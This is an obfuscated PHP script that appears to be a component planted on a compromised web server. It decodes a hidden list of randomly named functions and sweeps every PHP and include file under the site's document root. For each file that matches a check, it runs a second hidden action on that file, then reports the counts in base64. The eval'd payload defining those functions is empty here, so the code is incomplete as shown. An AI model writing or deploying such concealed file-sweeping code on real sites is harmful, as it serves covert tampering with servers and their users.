eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo4NTp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo4OiJya2JoYnpvbSI7aToyO3M6MTA6ImdyZXF3bGlzeXEiO31pOjE7YTozOntpOjA7aTo1O2k6MTtzOjY6InJ6YXFpayI7aToyO3M6NToiZ25qd3YiO31pOjI7YTozOntpOjA7aToxNTtpOjE7czoxMToicnB2aWtteW9vZXkiO2k6MjtzOjU6Imd6anBqIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6Njoicnp5aHh1IjtpOjI7czo0OiJna3VmIjt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6NzoicnFjdHNqdiI7aToyO3M6OToiZ3lxeGhkeHZkIjt9aTo1O2E6Mzp7aTowO2k6MzY7aToxO3M6MTE6InJpanBpdmhlYXRjIjtpOjI7czo1OiJncmduYSI7fWk6NjthOjM6e2k6MDtpOjQyO2k6MTtzOjU6InJtaWtrIjtpOjI7czo3OiJnaGR4ZmRtIjt9aTo3O2E6Mzp7aTowO2k6NTQ7aToxO3M6NToicmd3YnMiO2k6MjtzOjk6ImdybXFzeXZnaCI7fWk6ODthOjM6e2k6MDtpOjYwO2k6MTtzOjY6InJxZXJlZSI7aToyO3M6NDoiZ3RwcCI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjU6InJqdHFmIjtpOjI7czo1OiJnZmNieSI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6NzoicnBwdHpldiI7aToyO3M6OToiZ2R1YmR2bWtjIjt9aToxMTthOjM6e2k6MDtpOjExMDtpOjE7czo5OiJyZnlwZnRqZngiO2k6MjtzOjc6ImdwZmRmZHYiO31pOjEyO2E6Mzp7aTowO2k6MTExO2k6MTtzOjExOiJyd2Fqb3hpaXR0eSI7aToyO3M6MTE6ImdjbWlkbGJucGRsIjt9aToxMzthOjM6e2k6MDtpOjExMjtpOjE7czo1OiJydnpjYyI7aToyO3M6MTE6ImdkbXp4eW1kYnB5Ijt9aToxNDthOjM6e2k6MDtpOjExNTtpOjE7czoxMDoicm11dW1keWd3aSI7aToyO3M6NDoiZ2J4aiI7fWk6MTU7YTozOntpOjA7aToxMTg7aToxO3M6OToicnRnZXppc2h0IjtpOjI7czo1OiJnYnp6biI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6MTA6InJoZHNzeXd4ZWciO2k6MjtzOjU6ImdmcWhnIjt9aToxNzthOjM6e2k6MDtpOjEyNztpOjE7czo3OiJyanJibHJsIjtpOjI7czo0OiJnemN3Ijt9aToxODthOjM6e2k6MDtpOjEzMDtpOjE7czo1OiJyYmN4eiI7aToyO3M6NjoiZ3J0Z21zIjt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo3OiJydW52eWdnIjtpOjI7czo4OiJncmZmbGxscyI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6MTA6InJ5cm5hamhsZm8iO2k6MjtzOjk6Imd5bGVmcWZudiI7fWk6MjE7YTozOntpOjA7aToxNDg7aToxO3M6MTA6InJtZm5ydmxnY2oiO2k6MjtzOjY6Imdwa2prZSI7fWk6MjI7YTozOntpOjA7aToxNTc7aToxO3M6OToicnJ1a25sYndoIjtpOjI7czo5OiJnZG9sZGd4Y20iO31pOjIzO2E6Mzp7aTowO2k6MTYzO2k6MTtzOjU6InJpdWlmIjtpOjI7czo3OiJnbmdvbHB0Ijt9aToyNDthOjM6e2k6MDtpOjE3MjtpOjE7czo5OiJyaWJtamRjaWkiO2k6MjtzOjY6ImdqaXFpaiI7fWk6MjU7YTozOntpOjA7aToxNzQ7aToxO3M6NToicnFyaHoiO2k6MjtzOjc6Imd4bmJvY3oiO31pOjI2O2E6Mzp7aTowO2k6MTc5O2k6MTtzOjk6InJqYW5wcHNwbyI7aToyO3M6ODoiZ2Vvc21xa2wiO31pOjI3O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjQ6InJmcWQiO2k6MjtzOjk6ImdodXVuY29ubCI7fWk6Mjg7YTozOntpOjA7aToxODk7aToxO3M6OToicmZkandobmFxIjtpOjI7czo2OiJna25yYmwiO31pOjI5O2E6Mzp7aTowO2k6MTkyO2k6MTtzOjEwOiJya3RleXBueW10IjtpOjI7czoxMDoiZ3FpcXN0dmJ3cSI7fWk6MzA7YTozOntpOjA7aToxOTY7aToxO3M6OToicmd1dHloZ25yIjtpOjI7czo0OiJnYmhoIjt9aTozMTthOjM6e2k6MDtpOjE5ODtpOjE7czo3OiJydnpobWJzIjtpOjI7czo4OiJnZG9tc2NmZiI7fWk6MzI7YTozOntpOjA7aToxOTk7aToxO3M6Njoicmp5Z2pqIjtpOjI7czo1OiJncnZobiI7fWk6MzM7YTozOntpOjA7aToyMDA7aToxO3M6NjoicmZodWNsIjtpOjI7czo5OiJncm9pZ3VzY28iO31pOjM0O2E6Mzp7aTowO2k6MjAxO2k6MTtzOjc6InJlamx4eW8iO2k6MjtzOjc6ImdrZnR4Z20iO31pOjM1O2E6Mzp7aTowO2k6MjAzO2k6MTtzOjExOiJya256dnV6b3R1dCI7aToyO3M6NDoiZ3FteSI7fWk6MzY7YTozOntpOjA7aToyMDY7aToxO3M6NDoicnJkYSI7aToyO3M6NzoiZ2h3bWh5ayI7fWk6Mzc7YTozOntpOjA7aToyMDk7aToxO3M6NDoicnF1YiI7aToyO3M6MTE6ImdseWx4a2poeXBmIjt9aTozODthOjM6e2k6MDtpOjIxMDtpOjE7czo4OiJycnZhbnhoZCI7aToyO3M6ODoiZ3ZveHdqZ20iO31pOjM5O2E6Mzp7aTowO2k6MjEyO2k6MTtzOjEwOiJyemhnaXFxb21tIjtpOjI7czo2OiJnY2hkZXQiO31pOjQwO2E6Mzp7aTowO2k6MjEzO2k6MTtzOjc6InJlb3ZodHIiO2k6MjtzOjExOiJnY3Vpb2xobmt6YSI7fWk6NDE7YTozOntpOjA7aToyMTQ7aToxO3M6OToicmFtZnF1eXNuIjtpOjI7czo3OiJnZ3F1cmp3Ijt9aTo0MjthOjM6e2k6MDtpOjIxNTtpOjE7czo0OiJya3BpIjtpOjI7czo1OiJnY2NkbCI7fWk6NDM7YTozOntpOjA7aToyMTY7aToxO3M6ODoicmx3YWl6dnIiO2k6MjtzOjEwOiJnY2JzdHJ2ZGNkIjt9aTo0NDthOjM6e2k6MDtpOjIxNztpOjE7czo2OiJycXVkeW8iO2k6MjtzOjc6ImdybHFycnciO31pOjQ1O2E6Mzp7aTowO2k6MjE4O2k6MTtzOjU6InJzbmVoIjtpOjI7czo1OiJnbHBlYiI7fWk6NDY7YTozOntpOjA7aToyMjE7aToxO3M6MTA6InJpdmhkY3hyaHAiO2k6MjtzOjEwOiJnZXJyaWx5bWRjIjt9aTo0NzthOjM6e2k6MDtpOjIyMjtpOjE7czoxMDoicnFzc2Z1bXBqbCI7aToyO3M6MTA6Imd5dGdvdWhhY2oiO31pOjQ4O2E6Mzp7aTowO2k6MjIzO2k6MTtzOjQ6InJtaHUiO2k6MjtzOjk6ImdldHB3ZXBtbSI7fWk6NDk7YTozOntpOjA7aToyMjQ7aToxO3M6NjoicmVhcXFzIjtpOjI7czoxMDoiZ2JkZHR5aml5bSI7fWk6NTA7YTozOntpOjA7aToyMjU7aToxO3M6NjoicmRoaWdqIjtpOjI7czo5OiJndnd4cnB0aWwiO31pOjUxO2E6Mzp7aTowO2k6MjMwO2k6MTtzOjU6InJkdnlvIjtpOjI7czo1OiJna2N2ZCI7fWk6NTI7YTozOntpOjA7aToyMzI7aToxO3M6OToicnhleHltdGl1IjtpOjI7czoxMDoiZ3JnbHJwbGJhZSI7fWk6NTM7YTozOntpOjA7aToyMzU7aToxO3M6NjoicnNxYmViIjtpOjI7czoxMToiZ3R1cGF1aHRpYmgiO31pOjU0O2E6Mzp7aTowO2k6MjM2O2k6MTtzOjEwOiJyYWt2ZmdocW9oIjtpOjI7czo5OiJncHh3b2R6bG8iO31pOjU1O2E6Mzp7aTowO2k6MjM3O2k6MTtzOjExOiJycnVocmF2enRpcSI7aToyO3M6MTE6ImdtcHl6dHZzaXFhIjt9aTo1NjthOjM6e2k6MDtpOjIzODtpOjE7czo2OiJyenVwdGEiO2k6MjtzOjc6ImdjcHdtZHkiO31pOjU3O2E6Mzp7aTowO2k6MjM5O2k6MTtzOjU6InJla2FsIjtpOjI7czoxMToiZ3dob3hoam96YmMiO31pOjU4O2E6Mzp7aTowO2k6MjQwO2k6MTtzOjk6InJtbnRqeHZhciI7aToyO3M6NjoiZ2FkZWpxIjt9aTo1OTthOjM6e2k6MDtpOjI0MTtpOjE7czo5OiJyb2Zha295cmsiO2k6MjtzOjg6Imdvb3dhaXRnIjt9aTo2MDthOjM6e2k6MDtpOjI0MjtpOjE7czoxMToicm5qcXRld2V6b2YiO2k6MjtzOjQ6ImdzZ3giO31pOjYxO2E6Mzp7aTowO2k6MjQzO2k6MTtzOjg6InJ5d3FmY2l3IjtpOjI7czoxMToiZ2Fuem9wZnVud20iO31pOjYyO2E6Mzp7aTowO2k6MjQ0O2k6MTtzOjEwOiJyaWJhaXFjZHhvIjtpOjI7czo4OiJnbmZsd3VjYSI7fWk6NjM7YTozOntpOjA7aToyNDU7aToxO3M6NzoicmNjb3lldCI7aToyO3M6NzoiZ3Zuc2pzcSI7fWk6NjQ7YTozOntpOjA7aToyNDY7aToxO3M6NjoicnNpc3dnIjtpOjI7czo4OiJnbXhvdGVzciI7fWk6NjU7YTozOntpOjA7aToyNDc7aToxO3M6NToicm9iaGIiO2k6MjtzOjk6ImdmbHhxY2R6ZyI7fWk6NjY7YTozOntpOjA7aToyNDg7aToxO3M6NzoicmtiZm5xcCI7aToyO3M6NToiZ3llaXoiO31pOjY3O2E6Mzp7aTowO2k6MjQ5O2k6MTtzOjEwOiJybHF1YWV4bnphIjtpOjI7czo1OiJnamdqdiI7fWk6Njg7YTozOntpOjA7aToyNTA7aToxO3M6MTE6InJ5b2dybGZnZGVmIjtpOjI7czo2OiJnZHh2eXgiO31pOjY5O2E6Mzp7aTowO2k6MjUxO2k6MTtzOjg6InJtb2VuZnZ4IjtpOjI7czo5OiJnYWRwcXRkYXkiO31pOjcwO2E6Mzp7aTowO2k6MjUyO2k6MTtzOjk6InJsaXhobGJyYiI7aToyO3M6NToiZ25hc2IiO31pOjcxO2E6Mzp7aTowO2k6MjUzO2k6MTtzOjQ6InJuamgiO2k6MjtzOjQ6Imdhd2YiO31pOjcyO2E6Mzp7aTowO2k6MjU0O2k6MTtzOjU6InJyeXh2IjtpOjI7czo1OiJneGJvdCI7fWk6NzM7YTozOntpOjA7aToyNTU7aToxO3M6NDoicnVoaSI7aToyO3M6NDoiZ3B2bSI7fWk6NzQ7YTozOntpOjA7aToyNTY7aToxO3M6MTA6InJlc3JsdWZxcWUiO2k6MjtzOjk6Imd3aGRvZWxmeiI7fWk6NzU7YTozOntpOjA7aToyNTc7aToxO3M6Njoicmt5bnVtIjtpOjI7czo0OiJnbHFwIjt9aTo3NjthOjM6e2k6MDtpOjI1ODtpOjE7czo3OiJyYnl3dnBsIjtpOjI7czo1OiJnZG5wbSI7fWk6Nzc7YTozOntpOjA7aToyNTk7aToxO3M6Nzoicmh5dXh0diI7aToyO3M6NzoiZ2dsYnFrdyI7fWk6Nzg7YTozOntpOjA7aToyNjA7aToxO3M6OToicmZpaXl0YWNpIjtpOjI7czo5OiJnd29raXlzanciO31pOjc5O2E6Mzp7aTowO2k6MjYxO2k6MTtzOjQ6InJwYnYiO2k6MjtzOjExOiJnd3djdWNjcHVvcyI7fWk6ODA7YTozOntpOjA7aToyNjI7aToxO3M6MTA6InJuY2VwemxlYWoiO2k6MjtzOjEwOiJncXJvbGl1b3JjIjt9aTo4MTthOjM6e2k6MDtpOjI2MztpOjE7czo5OiJyb2Nxd2l3bG0iO2k6MjtzOjQ6ImdnZXQiO31pOjgyO2E6Mzp7aTowO2k6MjY0O2k6MTtzOjc6InJmamVjZXgiO2k6MjtzOjQ6Imdpc24iO31pOjgzO2E6Mzp7aTowO2k6MjY1O2k6MTtzOjExOiJycW93cW1sZGpqYiI7aToyO3M6NjoiZ3hmamRzIjt9aTo4NDthOjM6e2k6MDtpOjI2NjtpOjE7czo4OiJyZHRlZXFqbiI7aToyO3M6ODoiZ2N3ZnV1amciO319"));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();